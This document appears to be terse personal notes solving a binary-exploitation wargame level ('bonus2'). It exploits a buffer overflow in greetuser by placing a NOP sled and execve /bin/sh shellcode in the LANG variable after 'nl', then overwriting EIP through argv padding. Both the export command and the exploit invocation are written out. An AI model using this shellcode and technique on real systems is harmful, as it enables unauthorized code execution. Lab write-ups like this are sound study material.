sooo

we have some env language var from terminal  that will change if nl or fi
we have a bufferoverflow with 40 A 40 bs before call to greetuser.
eip seems to be overwritten wit 2 bs just after memcpy in call to greetuser


hehe if we go to nl we can override eip completetly thus taking control of code exec flow on 2nd arg offset 19 
1st idea would be to put payload argv1, argv2=padding+adress av[1] + padding
problem for some reason at the end of greetuser the data, strcat fucks up my resul which doesnt point to shellcode.

but if we check getenv we can see getenv has a "secure version", so lets check getenv

the thing is memcmp for the language param inside program just checks for 1st 2 chars.
So we can append to the lang a string which will be put on stack at result of getenv function

now we can put shellcode somewhere it wont move

NETHERLANDS + SHELLCODE


export LANG=$(python -c "print 'nl' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

situated at 0xbffffeb8, little offset to lan after nl in nop slide and we good

./bonus2 $(python -c "print 'A' * 40")  $(python -c "print 'B' * 23 + '\xdf\xfe\xff\xbf' + 'B' * 13")
